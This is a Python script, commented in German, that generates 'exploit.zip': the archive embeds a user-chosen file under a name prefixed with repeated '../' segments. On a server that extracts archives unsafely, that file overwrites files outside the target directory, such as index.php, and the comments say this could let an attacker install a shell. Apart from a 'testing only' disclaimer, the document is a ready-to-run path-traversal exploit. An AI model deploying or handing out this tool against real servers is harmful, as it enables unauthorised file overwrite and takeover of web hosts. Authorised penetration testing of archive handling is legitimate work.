#!/usr/bin/python
# Dieser Exploit erstellt ZIP Dateien, die Path Traversing Sicherheitslücken
# auf Webseiten, Diensten oder Anwendungen ausnutzen.
# Wichtige Anmerkung: Das Ganze dient nur zu Testzwecken und soll
# keinesfalls negativ ausgenutzt werden!

# Usage: python3 zip-path-traversal-exploit.py <datei> <path traversing level>
# Beispiel: python3 zip-path-traversal-exploit.py index.php 5
# Sobald die ZIP Datei auf einem verwundbaren Web Server extrahiert wird,
# landet diese im ../../../../../index.php Verzeichnis.
# Demzufolge wird dann wahrscheinlich die eigentliche index.php überschrieben

# Die Gefahr besteht, dass Angreifer auf dem Web-Server eine Shell installieren können
# und Zugriff auf den Host erlangen können!

from pyzip import PyZip
import sys

pyzip = PyZip()
args = sys.argv

if len(args) != 3:
    print('Usage: ' + args[0] + ' <datei> <path traversing level>')
else:
    fileName = args[1]
    pathTraversingLevel = int(args[2])

    with open(fileName, "rb") as exploitFile:
        exploitFileBinary = bytearray(exploitFile.read())
    
    pyzip = PyZip({'../' * pathTraversingLevel + fileName: exploitFileBinary})
    pyzip.save('exploit.zip')

    print('ZIP Datei wurde erfolgreich erstellt!')